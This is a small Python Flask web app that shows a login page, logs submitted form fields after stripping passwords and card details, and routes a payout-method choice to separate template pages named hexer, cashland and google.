from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    # Print the submitted form fields, excluding sensitive fields.
    data = request.form.to_dict()

    for key in ["password", "card_number", "cvv", "pin"]:
        data.pop(key, None)

    print("LOGIN FORM:", data, flush=True)

    return redirect("/payout")


@app.route("/payout")
def payout():
    return render_template("payout.html")


@app.route("/payout/select", methods=["POST"])
def payout_select():
    data = request.form.to_dict()

    print("PAYOUT FORM:", data, flush=True)

    method = request.form.get("method")

    if method == "hexer":
        return redirect("/hexer")

    if method == "cashland":
        return redirect("/cashland")

    if method == "card":
        return redirect("/google")

    return redirect("/payout")


@app.route("/hexer")
def hexer():
    return render_template("hexer.html")


@app.route("/cashland")
def cashland():
    return render_template("cashland.html")


@app.route("/google")
def google():
    return render_template("google.html")


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=False
    )
